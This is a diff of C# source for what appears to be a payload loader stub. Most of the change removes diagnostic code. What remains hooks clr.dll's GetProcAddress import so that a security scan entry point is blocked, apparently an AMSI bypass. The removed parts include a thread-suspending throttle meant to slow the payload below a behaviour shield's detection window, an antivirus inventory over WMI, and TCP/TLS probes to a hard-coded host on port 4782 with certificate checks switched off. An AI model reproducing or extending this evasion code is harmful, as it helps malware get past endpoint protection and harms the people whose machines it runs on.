-            return originalWinExec(commandLine, showCommand);
-        }
 
         // A dropped script is written and then usually gone again within milliseconds, so a
         // directory poll misses it. The exact path is known here, so a short lived reader can
         // grab the bytes while the payload still has the file open.
-        private static void WatchDrop(string path)
-        {
-            lock (dropWatchSync)
-            {
-                if (dropWatch.Contains(path))
-                {
-                    return;
-                }
-                dropWatch.Add(path);
-            }
-            try
-            {
-                Thread reader = new Thread(DropReader);
-                reader.IsBackground = true;
-                reader.Start(path);
-            }
-            catch
-            {
-            }
-        }
-
-        private static void DropReader(object state)
-        {
-            string path = (string)state;
-            for (int attempt = 0; attempt < 400; attempt++)
-            {
-                try
-                {
-                    if (File.Exists(path))
-                    {
-                        using (FileStream stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
-                        {
-                            byte[] bytes = new byte[65536];
-                            int read = stream.Read(bytes, 0, bytes.Length);
-                            if (read > 0)
-                            {
-                                StringBuilder text = new StringBuilder();
-                                for (int i = 0; i < read; i++)
-                                {
-                                    byte value = bytes[i];
-                                    if (value == 13)
-                                    {
-                                        text.Append("\\r");
-                                    }
-                                    else if (value == 10)
-                                    {
-                                        text.Append("\\n");
-                                    }
-                                    else if (value >= 32 && value < 127)
-                                    {
-                                        text.Append((char)value);
-                                    }
-                                    else
-                                    {
-                                        text.Append('.');
-                                    }
-                                }
-                                TraceApi("content " + path + " >>> " + text.ToString());
-                                return;
-                            }
-                        }
-                    }
-                }
-                catch
-                {
-                }
-                Thread.Sleep(5);
-            }
-            TraceApi("content " + path + " >>> (never became readable)");
-        }
-
-        // ---- pacing ---------------------------------------------------------
-        // A behaviour shield scores what a process does over a window, so the same actions
-        // are far less telling when they are spread out. This option duty cycles every thread
-        // of the process except this one: nothing about what the payload does changes, only
-        // how fast it does it. SetThreadPriority and sleep alone cannot reach the payload's
-        // own threads, which is why the thread list is walked here.
-        [StructLayout(LayoutKind.Sequential)]
-        private struct ThreadEntry
-        {
-            public uint dwSize;
-            public uint cntUsage;
-            public uint th32ThreadID;
-            public uint th32OwnerProcessID;
-            public int tpBasePri;
-            public int tpDeltaPri;
-            public uint dwFlags;
-        }
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint processId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool Thread32First(IntPtr snapshot, ref ThreadEntry entry);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool Thread32Next(IntPtr snapshot, ref ThreadEntry entry);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr OpenThread(uint access, bool inheritHandle, uint threadId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern uint SuspendThread(IntPtr thread);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern uint ResumeThread(IntPtr thread);
-
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        private static extern uint GetCurrentThreadId();
-
-        private static void StartThrottle()
-        {
-            try
-            {
-                Thread pacer = new Thread(PaceLoop);
-                pacer.IsBackground = true;
-                pacer.Name = "pace";
-                pacer.Start();
-                Log("throttle: suspending all other threads " + throttleSuspendMs +
-                    "ms out of every " + (throttleSuspendMs + throttleResumeMs) + "ms");
-            }
-            catch (Exception ex)
-            {
-                Log("throttle: start failed: " + ex.Message);
-            }
-        }
-
-        // Everything between the suspend and the resume loop is allocation free on purpose:
-        // a suspended thread can be holding the heap or the loader lock, so this thread must
-        // not touch the runtime until it has resumed them again.
-        private static void PaceLoop()
-        {
-            uint self = GetCurrentThreadId();
-            uint selfProcess = (uint)Process.GetCurrentProcess().Id;
-            ThreadEntry entry = new ThreadEntry();
-            entry.dwSize = (uint)Marshal.SizeOf(typeof(ThreadEntry));
-
-            IntPtr[] openThreads = new IntPtr[512];
-
-            while (!throttleStop)
-            {
-                int opened = 0;
-                IntPtr snapshot = CreateToolhelp32Snapshot(0x00000004, 0);
-                if (snapshot != (IntPtr)(-1))
-                {
-                    if (Thread32First(snapshot, ref entry))
-                    {
-                        do
-                        {
-                            if (entry.th32OwnerProcessID == selfProcess && entry.th32ThreadID != self &&
-                                opened < openThreads.Length)
-                            {
-                                IntPtr handle = OpenThread(0x0002, false, entry.th32ThreadID);
-                                if (handle != IntPtr.Zero)
-                                {
-                                    openThreads[opened] = handle;
-                                    opened++;
-                                }
-                            }
-                        }
-                        while (Thread32Next(snapshot, ref entry));
-                    }
-                    CloseHandle(snapshot);
-                }
-
-                for (int i = 0; i < opened; i++)
-                {
-                    SuspendThread(openThreads[i]);
-                }
-
-                Thread.Sleep(throttleSuspendMs);
-
-                for (int i = 0; i < opened; i++)
-                {
-                    ResumeThread(openThreads[i]);
-                    CloseHandle(openThreads[i]);
-                    openThreads[i] = IntPtr.Zero;
-                }
-
-                if (throttleResumeMs > 0)
-                {
-                    Thread.Sleep(throttleResumeMs);
-                }
-            }
-        }
-
-        // Directory notification for --nc-dropwatch. The api trace cannot see the payload's
-        // managed file writes, so the drop is observed where it happens: the file system. The
-        // notification comes from the filter driver, which is fast enough to catch a file the
-        // protection removes again in the same millisecond. Several roots are watched at once
-        // because the payload chooses its own drop directory and the alert only names the file.
-        private static void StartDropWatch()
-        {
-            string[] roots = new string[]
-            {
-                Path.GetTempPath(),
-                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
-                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp"),
-                Environment.CurrentDirectory
-            };
-
-            List<string> watched = new List<string>();
-            for (int i = 0; i < roots.Length; i++)
-            {
-                string root = roots[i];
-                if (String.IsNullOrEmpty(root))
-                {
-                    continue;
-                }
-
-                bool already = false;
-                for (int j = 0; j < watched.Count; j++)
-                {
-                    if (String.Equals(watched[j], root, StringComparison.OrdinalIgnoreCase))
-                    {
-                        already = true;
-                        break;
-                    }
-                }
-                if (already || !Directory.Exists(root))
-                {
-                    continue;
-                }
-
-                try
-                {
-                    FileSystemWatcher watcher = new FileSystemWatcher(root);
-                    watcher.IncludeSubdirectories = false;
-                    watcher.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName |
-                        NotifyFilters.LastWrite | NotifyFilters.CreationTime | NotifyFilters.Size;
-                    watcher.InternalBufferSize = 65536;
-                    watcher.Created += OnDropFileEvent;
-                    watcher.Changed += OnDropFileEvent;
-                    watcher.Deleted += OnDropFileEvent;
-                    watcher.Renamed += OnDropFileRenamed;
-                    watcher.EnableRaisingEvents = true;
-                    watched.Add(root);
-                    Log("dropwatch: watching " + root);
-                }
-                catch (Exception ex)
-                {
-                    Log("dropwatch: cannot watch " + root + ": " + ex.Message);
-                }
-            }
-
-            RunDropWatchSelfTest(watched);
-        }
-
-        // Writes and removes a probe file in every watched root. Without it, a run with no
-        // events cannot be told apart from one whose notifications never arrive.
-        private static void RunDropWatchSelfTest(List<string> watched)
-        {
-            for (int i = 0; i < watched.Count; i++)
-            {
-                string probe = Path.Combine(watched[i], "ncstub-selftest.tmp");
-                try
-                {
-                    File.WriteAllText(probe, "dropwatch self test");
-                    Thread.Sleep(120);
-                    File.Delete(probe);
-                    Log("dropwatch: self test in " + watched[i]);
-                }
-                catch (Exception ex)
-                {
-                    Log("dropwatch: self test failed in " + watched[i] + ": " + ex.Message);
-                }
-            }
-        }
-
-        private static bool IsSelfTestFile(string path)
-        {
-            string name = Path.GetFileName(path);
-            return name.StartsWith("ncstub-selftest", StringComparison.OrdinalIgnoreCase);
-        }
-
-        private static bool IsIgnoredDrop(string path)
-        {
-            string name = Path.GetFileName(path);
-            if (String.Equals(name, "ncstub.log", StringComparison.OrdinalIgnoreCase))
-            {
-                return true;
-            }
-            if (String.Equals(name, "ncinspect.log", StringComparison.OrdinalIgnoreCase))
-            {
-                return true;
-            }
-            return false;
-        }
-
-        private static void OnDropFileRenamed(object sender, RenamedEventArgs args)
-        {
-            if (IsIgnoredDrop(args.FullPath))
-            {
-                return;
-            }
-            Log("dropwatch: renamed " + args.OldFullPath + " -> " + args.FullPath);
-            if (!IsSelfTestFile(args.FullPath))
-            {
-                WatchDropFile(args.FullPath);
-            }
-        }
-
-        private static void OnDropFileEvent(object sender, FileSystemEventArgs args)
-        {
-            if (IsIgnoredDrop(args.FullPath))
-            {
-                return;
-            }
-            Log("dropwatch: " + args.ChangeType + " " + args.FullPath);
-            if (!IsSelfTestFile(args.FullPath))
-            {
-                WatchDropFile(args.FullPath);
-            }
-        }
-
-        private static void WatchDropFile(string path)
-        {
-            lock (fsDropSync)
-            {
-                if (!fsDropSeen.Add(path))
-                {
-                    return;
-                }
-            }
-            try
-            {
-                Thread reader = new Thread(DropFileReader);
-                reader.IsBackground = true;
-                reader.Start(path);
-            }
-            catch
-            {
-            }
-        }
-
-        private static void DropFileReader(object state)
-        {
-            string path = (string)state;
-            for (int attempt = 0; attempt < 400; attempt++)
-            {
-                try
-                {
-                    if (File.Exists(path))
-                    {
-                        using (FileStream stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
-                        {
-                            byte[] bytes = new byte[65536];
-                            int read = stream.Read(bytes, 0, bytes.Length);
-                            if (read > 0)
-                            {
-                                StringBuilder text = new StringBuilder();
-                                for (int i = 0; i < read; i++)
-                                {
-                                    byte value = bytes[i];
-                                    if (value == 13)
-                                    {
-                                        text.Append("\\r");
-                                    }
-                                    else if (value == 10)
-                                    {
-                                        text.Append("\\n");
-                                    }
-                                    else if (value >= 32 && value < 127)
-                                    {
-                                        text.Append((char)value);
-                                    }
-                                    else
-                                    {
-                                        text.Append('.');
-                                    }
-                                }
-                                Log("dropwatch: content " + path + " >>> " + text.ToString());
-                                return;
-                            }
-                        }
-                    }
-                }
-                catch
-                {
-                }
-                Thread.Sleep(5);
-            }
-            Log("dropwatch: content " + path + " >>> (never became readable)");
-        }
-
-        private static IntPtr ArgumentHook(string entry, IntPtr module, IntPtr name)
-        {
-            try
-            {
-                if (String.Equals(entry, "CreateFileW", StringComparison.OrdinalIgnoreCase))
-                {
-                    IntPtr real = originalGetProcAddress(module, name);
-                    if (real != IntPtr.Zero)
-                    {
-                        originalCreateFileW = (CreateFileWHook)Marshal.GetDelegateForFunctionPointer(real, typeof(CreateFileWHook));
-                        return Marshal.GetFunctionPointerForDelegate(createFileWHook);
-                    }
-                }
-                else if (String.Equals(entry, "CreateProcessW", StringComparison.OrdinalIgnoreCase))
-                {
-                    IntPtr real = originalGetProcAddress(module, name);
-                    if (real != IntPtr.Zero)
-                    {
-                        originalCreateProcessW = (CreateProcessWHook)Marshal.GetDelegateForFunctionPointer(real, typeof(CreateProcessWHook));
-                        return Marshal.GetFunctionPointerForDelegate(createProcessWHook);
-                    }
-                }
-                else if (String.Equals(entry, "ShellExecuteExW", StringComparison.OrdinalIgnoreCase))
-                {
-                    IntPtr real = originalGetProcAddress(module, name);
-                    if (real != IntPtr.Zero)
-                    {
-                        originalShellExecuteExW = (ShellExecuteExWHook)Marshal.GetDelegateForFunctionPointer(real, typeof(ShellExecuteExWHook));
-                        return Marshal.GetFunctionPointerForDelegate(shellExecuteExWHook);
-                    }
-                }
-                else if (String.Equals(entry, "WinExec", StringComparison.OrdinalIgnoreCase))
-                {
-                    IntPtr real = originalGetProcAddress(module, name);
-                    if (real != IntPtr.Zero)
-                    {
-                        originalWinExec = (WinExecHook)Marshal.GetDelegateForFunctionPointer(real, typeof(WinExecHook));
-                        return Marshal.GetFunctionPointerForDelegate(winExecHook);
-                    }
-                }
-            }
-            catch
-            {
-            }
-            return IntPtr.Zero;
-        }
-
-        private static void TraceApi(string entry)
-        {
-            try
-            {
-                lock (apiTraceSync)
-                {
-                    if (apiTraceBuffer.Count >= ApiTraceLimit)
-                    {
-                        apiTraceDropped++;
-                        return;
-                    }
-                    apiTraceBuffer.Add(entry);
-                }
-            }
-            catch
-            {
-            }
-        }
-
-        private static void FlushApiTrace()
-        {
-            try
-            {
-                string[] pending;
-                int dropped;
-                lock (apiTraceSync)
-                {
-                    if (apiTraceBuffer.Count == 0 && apiTraceDropped == 0)
-                    {
-                        return;
-                    }
-                    pending = apiTraceBuffer.ToArray();
-                    dropped = apiTraceDropped;
-                    apiTraceBuffer.Clear();
-                    apiTraceDropped = 0;
-                }
-
-                for (int i = 0; i < pending.Length; i++)
-                {
-                    Log("api: " + pending[i]);
-                }
-                if (dropped > 0)
-                {
-                    Log("api: " + dropped + " entries dropped");
-                }
-            }
-            catch
-            {
-            }
-        }
 
         private static string ReadAnsiString(IntPtr pointer)
         {
@@ -1869,75 +772,11 @@ namespace stub
             return builder.ToString();
         }
 
-        private static string ReadWideString(IntPtr pointer)
-        {
-            if (pointer == IntPtr.Zero)
-            {
-                return null;
-            }
-            StringBuilder builder = new StringBuilder();
-            for (int i = 0; i < 512; i++)
-            {
-                int value = Marshal.ReadByte(pointer, i * 2) | (Marshal.ReadByte(pointer, i * 2 + 1) << 8);
-                if (value == 0)
-                {
-                    break;
-                }
-                builder.Append((char)value);
-            }
-            return builder.ToString();
-        }
-
-        // True when the named export is on the build's sinkhole list. The list is filled in by
-        // the packer; an empty list disables the mechanism entirely.
-        private static bool IsSinkholed(string entry)
-        {
-            for (int i = 0; i < sinkholeNames.Length; i++)
-            {
-                if (String.Equals(sinkholeNames[i], entry, StringComparison.OrdinalIgnoreCase))
-                {
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        // A routine that does nothing and reports failure. The runtime hands the payload this in
-        // place of a selected export, so the payload keeps its own code and control flow and only
-        // the selected call becomes inert.
-        private static IntPtr GetSinkholeStub()
-        {
-            if (sinkholeStub == IntPtr.Zero)
-            {
-                byte[] code = new byte[] { 0x31, 0xC0, 0xC3 };
-                IntPtr block = VirtualAlloc(IntPtr.Zero, (IntPtr)16, 0x3000, PAGE_READWRITE);
-                if (block == IntPtr.Zero)
-                {
-                    Log("sinkhole: allocation failed, error=" + Marshal.GetLastWin32Error());
-                    return IntPtr.Zero;
-                }
-                Marshal.Copy(code, 0, block, code.Length);
-                uint previous;
-                VirtualProtect(block, (IntPtr)code.Length, PAGE_EXECUTE_READ, out previous);
-                sinkholeStub = block;
-            }
-            return sinkholeStub;
-        }
-
         private static IntPtr HookGetProcAddressImpl(IntPtr module, IntPtr name)
         {
             try
             {
                 string entry = ReadAnsiString(name);
-                if (entry != null && IsSinkholed(entry))
-                {
-                    IntPtr sinkhole = GetSinkholeStub();
-                    if (sinkhole != IntPtr.Zero)
-                    {
-                        TraceApi("sinkhole " + entry);
-                        return sinkhole;
-                    }
-                }
                 if (scanLookupBlocked && module == blockedScanModule && String.Equals(entry, scanEntryName, StringComparison.Ordinal))
                 {
                     if (amsiResultStubActive)
@@ -1946,55 +785,9 @@ namespace stub
                     }
                     return IntPtr.Zero;
                 }
-                if (argumentTraceRequested && entry != null)
-                {
-                    IntPtr replaced = ArgumentHook(entry, module, name);
-                    if (replaced != IntPtr.Zero)
-                    {
-                        return replaced;
-                    }
-                }
-                if (!String.IsNullOrEmpty(entry))
-                {
-                    TraceApi("GetProcAddress " + entry);
-                }
             }
-            catch
-            {
-            }
+            catch { }
             return originalGetProcAddress(module, name);
-        }
-
-        private static IntPtr HookLoadLibraryImpl(IntPtr fileName)
-        {
-            try
-            {
-                string path = ReadWideString(fileName);
-                if (!String.IsNullOrEmpty(path))
-                {
-                    TraceApi("LoadLibrary " + path);
-                }
-            }
-            catch
-            {
-            }
-            return originalLoadLibrary(fileName);
-        }
-
-        private static IntPtr HookLoadLibraryExImpl(IntPtr fileName, IntPtr file, int flags)
-        {
-            try
-            {
-                string path = ReadWideString(fileName);
-                if (!String.IsNullOrEmpty(path))
-                {
-                    TraceApi("LoadLibraryEx " + path + " flags=0x" + flags.ToString("X"));
-                }
-            }
-            catch
-            {
-            }
-            return originalLoadLibraryEx(fileName, file, flags);
         }
 
         private static bool PatchPointer(IntPtr slot, IntPtr replacement)
@@ -2004,7 +797,6 @@ namespace stub
                 uint previous;
                 if (!VirtualProtect(slot, (IntPtr)IntPtr.Size, PAGE_READWRITE, out previous))
                 {
-                    Log("apitrace: VirtualProtect failed, error=" + Marshal.GetLastWin32Error());
                     return false;
                 }
                 Marshal.WriteIntPtr(slot, replacement);
@@ -2012,9 +804,8 @@ namespace stub
                 VirtualProtect(slot, (IntPtr)IntPtr.Size, previous, out restored);
                 return true;
             }
-            catch (Exception ex)
+            catch
             {
-                Log("apitrace: patch failed: " + ex.Message);
                 return false;
             }
         }
@@ -2040,22 +831,19 @@ namespace stub
 
         private static void RestorePatchedImports()
         {
-            int restored = 0;
             for (int i = 0; i < patchedImportCount; i++)
             {
                 if (patchedImportSlots[i] != IntPtr.Zero && PatchPointer(patchedImportSlots[i], patchedImportValues[i]))
                 {
                     patchedImportSlots[i] = IntPtr.Zero;
-                    restored++;
                 }
             }
             patchedImportCount = 0;
             scanLookupBlocked = false;
             amsiResultStubActive = false;
-            Log("unhook: restored " + restored + " import entries");
         }
 
-        private static int PatchImportTable(IntPtr moduleBase)
+        private static void PatchImportTable(IntPtr moduleBase)
         {
             int peOffset = Marshal.ReadInt32(moduleBase, 0x3C);
             IntPtr optionalHeader = new IntPtr(moduleBase.ToInt64() + peOffset + 24);
@@ -2065,11 +853,9 @@ namespace stub
             int importSize = Marshal.ReadInt32(optionalHeader, dataDirectoryOffset + 12);
             if (importRva <= 0 || importSize <= 0)
             {
-                Log("apitrace: import directory unusable (rva=" + importRva + ", size=" + importSize + ")");
-                return 0;
+                return;
             }
 
-            int patched = 0;
             for (int i = 0; ; i++)
             {
                 IntPtr descriptor = new IntPtr(moduleBase.ToInt64() + importRva + i * 20);
@@ -2104,31 +890,10 @@ namespace stub
                     if (importedName == "GetProcAddress")
                     {
                         originalGetProcAddress = (RawGetProcAddress)Marshal.GetDelegateForFunctionPointer(Marshal.ReadIntPtr(slot), typeof(RawGetProcAddress));
-                        if (PatchAndRemember(slot, Marshal.GetFunctionPointerForDelegate(hookGetProcAddress)))
-                        {
-                            patched++;
-                            Log("apitrace: hooked " + provider + "!GetProcAddress at 0x" + slot.ToInt64().ToString("X"));
-                        }
-                    }
-                    else if (importedName == "LoadLibraryW")
-                    {
-                        originalLoadLibrary = (RawLoadLibrary)Marshal.GetDelegateForFunctionPointer(Marshal.ReadIntPtr(slot), typeof(RawLoadLibrary));
-                        if (PatchAndRemember(slot, Marshal.GetFunctionPointerForDelegate(hookLoadLibrary)))
-                        {
-                            patched++;
-                        }
-                    }
-                    else if (importedName == "LoadLibraryExW")
-                    {
-                        originalLoadLibraryEx = (RawLoadLibraryEx)Marshal.GetDelegateForFunctionPointer(Marshal.ReadIntPtr(slot), typeof(RawLoadLibraryEx));
-                        if (PatchAndRemember(slot, Marshal.GetFunctionPointerForDelegate(hookLoadLibraryEx)))
-                        {
-                            patched++;
-                        }
+                        PatchAndRemember(slot, Marshal.GetFunctionPointerForDelegate(hookGetProcAddress));
                     }
                 }
             }
-            return patched;
         }
 
         private static IntPtr FindLoadedModule(string moduleName)
@@ -2153,389 +918,26 @@ namespace stub
             apiTraceInstalled = true;
             try
             {
-                // Resolve the probes the watcher thread uses first, so their lazy P/Invoke
-                // bindings do not show up as payload activity in the trace.
-                try { IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections(); }
-                catch { }
                 try { Process.GetProcesses(); }
                 catch { }
                 try { FindLoadedModule("kernel32.dll"); }
                 catch { }
 
                 hookGetProcAddress = HookGetProcAddressImpl;
-                hookLoadLibrary = HookLoadLibraryImpl;
-                hookLoadLibraryEx = HookLoadLibraryExImpl;
-                if (argumentTraceRequested)
-                {
-                    createFileWHook = HookCreateFileW;
-                    createProcessWHook = HookCreateProcessW;
-                    shellExecuteExWHook = HookShellExecuteExW;
-                    winExecHook = HookWinExec;
-                }
-
                 IntPtr clr = FindLoadedModule("clr.dll");
                 if (clr == IntPtr.Zero)
                 {
-                    Log("apitrace: clr.dll not loaded");
                     return;
                 }
 
-                int hooked = PatchImportTable(clr);
-                Log("apitrace: clr.dll=0x" + clr.ToInt64().ToString("X") + ", import entries hooked=" + hooked);
+                PatchImportTable(clr);
             }
-            catch (Exception ex)
-            {
-                Log("apitrace: install failed: " + ex.Message);
-            }
-        }
-
-        private static void OnAssemblyLoad(object sender, AssemblyLoadEventArgs args)
-        {
-            try
-            {
-                Log("assembly load: " + args.LoadedAssembly.FullName);
-            }
-            catch (Exception ex)
-            {
-                Log("assembly load: name unavailable (" + ex.Message + ")");
-            }
+            catch { }
         }
 
         // ---- probes --------------------------------------------------------
-        // Loads the payload without running it (so the process looks the way it does when
-        // the protection reacts) and then performs the individual actions the payload's
-        // startup performs, one phase at a time, with an idle window after each phase.
-        // Whichever phase the log stops in is the action the protection reacts to.
-        private static bool probeRequested = false;
-        private static string probeHost = "192.168.127.129";
-        private static int probePort = 4782;
-
-        private static void RunProbes()
-        {
-            Log("probe: target " + probeHost + ":" + probePort);
-
-            Log("probe: phase tcp-connect");
-            try
-            {
-                using (TcpClient client = new TcpClient())
-                {
-                    client.Connect(probeHost, probePort);
-                    Log("probe: tcp connected " + client.Client.LocalEndPoint + " -> " + client.Client.RemoteEndPoint);
-                    ProbeIdle(15);
-                }
-            }
-            catch (Exception ex)
-            {
-                Log("probe: tcp connect failed: " + ex.GetType().Name + ": " + ex.Message);
-            }
-
-            Log("probe: phase tls-handshake");
-            try
-            {
-                using (TcpClient client = new TcpClient())
-                {
-                    client.Connect(probeHost, probePort);
-                    using (SslStream ssl = new SslStream(client.GetStream(), false, AcceptAnyCertificate))
-                    {
-                        ssl.AuthenticateAsClient(probeHost);
-                        Log("probe: tls established, protocol=" + ssl.SslProtocol + ", cipher=" + ssl.CipherAlgorithm);
-                        byte[] greeting = new byte[64];
-                        ssl.Write(greeting, 0, greeting.Length);
-                        Log("probe: tls wrote 64 bytes");
-                    }
-                    ProbeIdle(15);
-                }
-            }
-            catch (Exception ex)
-            {
-                Log("probe: tls failed: " + ex.GetType().Name + ": " + ex.Message);
-            }
-
-            Log("probe: phase wmi-av-query");
-            try
-            {
-                ProbeWmi();
-            }
-            catch (Exception ex)
-            {
-                Log("probe: wmi failed: " + ex.GetType().Name + ": " + ex.Message);
-            }
-
-            Log("probe: finished");
-        }
-
-        private static void ProbeIdle(int seconds)
-        {
-            for (int remaining = seconds; remaining > 0; remaining -= 5)
-            {
-                Thread.Sleep(5000);
-                Log("probe: idle " + Math.Max(remaining - 5, 0) + "s left");
-            }
-        }
-
-        private static bool AcceptAnyCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
-        {
-            try
-            {
-                Log("probe: server certificate=" + (certificate == null ? "<none>" : certificate.Subject) + "; errors=" + errors);
-            }
-            catch
-            {
-            }
-            return true;
-        }
-
-        private static void ProbeWmi()
-        {
-            Assembly managementAssembly = null;
-            string[] managementNames = new string[]
-            {
-                "System.Management, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
-                "System.Management"
-            };
-            for (int i = 0; i < managementNames.Length && managementAssembly == null; i++)
-            {
-                try
-                {
-                    managementAssembly = Assembly.Load(managementNames[i]);
-                    Log("probe: Assembly.Load('" + managementNames[i] + "') -> " + managementAssembly.FullName + " @ " + managementAssembly.Location);
-                }
-                catch (Exception ex)
-                {
-                    Log("probe: Assembly.Load('" + managementNames[i] + "') failed: " + ex.GetType().Name + ": " + ex.Message + " (hresult=0x" + Marshal.GetHRForException(ex).ToString("X8") + ")");
-                }
-            }
-            if (managementAssembly == null)
-            {
-                Log("probe: System.Management not available");
-                return;
-            }
-
-            Type searcherType = managementAssembly.GetType("System.Management.ManagementObjectSearcher", false);
-            if (searcherType == null)
-            {
-                Log("probe: ManagementObjectSearcher not found in " + managementAssembly.FullName);
-                return;
-            }
-            Log("probe: searcher type=" + searcherType.FullName + " from " + searcherType.Assembly.FullName);
-
-            object searcher = Activator.CreateInstance(searcherType, new object[] { "root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct" });
-            MethodInfo getMethod = searcherType.GetMethod("Get", Type.EmptyTypes);
-            Log("probe: wmi query start");
-            object results = getMethod.Invoke(searcher, null);
-            Log("probe: wmi query returned");
-            System.Collections.IEnumerable items = results as System.Collections.IEnumerable;
-            if (items == null)
-            {
-                Log("probe: wmi returned no enumerable");
-                return;
-            }
-
-            int count = 0;
-            foreach (object item in items)
-            {
-                count++;
-                Log("probe: wmi av entry " + count + ": " + ProbeWmiValues(item));
-            }
-            Log("probe: wmi av entries=" + count);
-            ProbeIdle(15);
-        }
-
-        private static string ProbeWmiValues(object item)
-        {
-            PropertyInfo indexer = item.GetType().GetProperty("Item", new Type[] { typeof(string) });
-            if (indexer == null)
-            {
-                return "<no indexer>";
-            }
-
-            string[] names = new string[] { "displayName", "pathToSignedProductExe", "instanceGuid" };
-            StringBuilder builder = new StringBuilder();
-            for (int i = 0; i < names.Length; i++)
-            {
-                try
-                {
-                    object value = indexer.GetValue(item, new object[] { names[i] });
-                    if (value != null)
-                    {
-                        if (builder.Length > 0)
-                        {
-                            builder.Append(", ");
-                        }
-                        builder.Append(names[i]).Append("=").Append(Convert.ToString(value));
-                    }
-                }
-                catch
-                {
-                }
-            }
-            return builder.ToString();
-        }
-
-        private static string HashHex(byte[] data)
-        {
-            using (MD5 md5 = MD5.Create())
-            {
-                byte[] hash = md5.ComputeHash(data);
-                StringBuilder builder = new StringBuilder(hash.Length * 2);
-                for (int i = 0; i < hash.Length; i++)
-                {
-                    builder.Append(hash[i].ToString("x2"));
-                }
-                return builder.ToString();
-            }
-        }
-
         // Diagnostic: makes every outbound connect() in this process fail with
         // WSAECONNREFUSED, so the payload can be observed while it cannot reach its server.
-        private static void NeutralizeConnect()
-        {
-            IntPtr module = LoadLibrary("ws2_32.dll");
-            if (module == IntPtr.Zero)
-            {
-                Log("noconnect: ws2_32.dll unavailable, error=" + Marshal.GetLastWin32Error());
-                return;
-            }
-
-            byte[] failStub = new byte[] { 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3 };
-            PatchCode(module, "connect", failStub);
-            PatchCode(module, "WSAConnect", failStub);
-
-            byte[] refuseStub = new byte[] { 0xB8, 0x6D, 0x27, 0x00, 0x00, 0xC3 };
-            PatchCode(module, "WSAGetLastError", refuseStub);
-        }
-
-        private static void PatchCode(IntPtr module, string name, byte[] replacement)
-        {
-            IntPtr address = GetProcAddress(module, name);
-            if (address == IntPtr.Zero)
-            {
-                Log("noconnect: export " + name + " not found");
-                return;
-            }
-
-            uint previous;
-            if (!VirtualProtect(address, (IntPtr)replacement.Length, PAGE_EXECUTE_READWRITE, out previous))
-            {
-                Log("noconnect: VirtualProtect failed for " + name + ", error=" + Marshal.GetLastWin32Error());
-                return;
-            }
-
-            Marshal.Copy(replacement, 0, address, replacement.Length);
-            uint restored;
-            VirtualProtect(address, (IntPtr)replacement.Length, previous, out restored);
-            Log("noconnect: patched ws2_32!" + name + " at 0x" + address.ToInt64().ToString("X"));
-        }
-
-        private static void InstallDiagnostics()
-        {
-            AppDomain.CurrentDomain.UnhandledException += OnUnhandledException;
-            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
-            AppDomain.CurrentDomain.AssemblyLoad += OnAssemblyLoad;
-            Application.ThreadException += OnThreadException;
-            Application.ApplicationExit += OnApplicationExit;
-            currentStage = "stub startup";
-            Log("stub start");
-            Log("stub build: " + StubBuildTag);
-        }
-
-        private static bool RunExitMonitorIfRequested()
-        {
-            string[] args = Environment.GetCommandLineArgs();
-            if (args.Length != 4 || args[1] != EXIT_MONITOR_ARGUMENT)
-            {
-                return false;
-            }
-
-            int parentId;
-            if (!Int32.TryParse(args[2], out parentId))
-            {
-                Log("EXIT MONITOR invalid parent id: " + args[2]);
-                return true;
-            }
-
-            string parentRunId = args[3];
-            IntPtr parentHandle = IntPtr.Zero;
-            try
-            {
-                parentHandle = OpenProcess(
-                    SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION,
-                    false,
-                    parentId);
-                if (parentHandle == IntPtr.Zero)
-                {
-                    throw new System.ComponentModel.Win32Exception(
-                        Marshal.GetLastWin32Error(),
-                        "OpenProcess failed for monitored parent.");
-                }
-
-                uint waitResult = WaitForSingleObject(parentHandle, INFINITE);
-                if (waitResult == WAIT_FAILED)
-                {
-                    throw new System.ComponentModel.Win32Exception(
-                        Marshal.GetLastWin32Error(),
-                        "WaitForSingleObject failed for monitored parent.");
-                }
-                if (waitResult != WAIT_OBJECT_0)
-                {
-                    throw new InvalidOperationException(
-                        "Unexpected process wait result: 0x" + waitResult.ToString("X8"));
-                }
-
-                uint exitCode;
-                if (!GetExitCodeProcess(parentHandle, out exitCode))
-                {
-                    throw new System.ComponentModel.Win32Exception(
-                        Marshal.GetLastWin32Error(),
-                        "GetExitCodeProcess failed for monitored parent.");
-                }
-                Log("exit observed; code=0x" + exitCode.ToString("X8"));
-            }
-            catch (Exception ex)
-            {
-                LogException("EXIT MONITOR FAILED; run=" + parentRunId + "; parentPid=" + parentId, ex);
-            }
-            finally
-            {
-                if (parentHandle != IntPtr.Zero)
-                {
-                    CloseHandle(parentHandle);
-                }
-            }
-            return true;
-        }
-
-        private static void StartExitMonitor()
-        {
-            try
-            {
-                Process current = Process.GetCurrentProcess();
-                string executablePath = Assembly.GetExecutingAssembly().Location;
-                if (String.IsNullOrEmpty(executablePath))
-                {
-                    Log("EXIT MONITOR not started: executable location is empty");
-                    return;
-                }
-
-                ProcessStartInfo startInfo = new ProcessStartInfo();
-                startInfo.FileName = executablePath;
